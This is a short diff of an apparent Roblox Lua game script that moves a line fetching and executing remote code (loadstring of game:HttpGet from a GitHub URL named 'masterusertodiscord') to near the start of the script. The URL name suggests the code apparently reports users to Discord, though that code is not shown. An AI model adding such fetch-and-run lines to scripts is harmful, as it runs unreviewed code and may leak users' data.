@@ -17,6 +17,8 @@ local success, message = pcall(function()
 end)
 
 print("Phase 2 : Checking Games")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yClematiS/Main_Loader/main/masterusertodiscord"))()
+
 local tocheck = game.PlaceId
 if tocheck == 2866967438 then
     _G.whatmap = "🎣 Fishing Simulator 2"
@@ -138,4 +140,3 @@ else
 end
 
 wait(0.2)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/yClematiS/Main_Loader/main/masterusertodiscord"))()
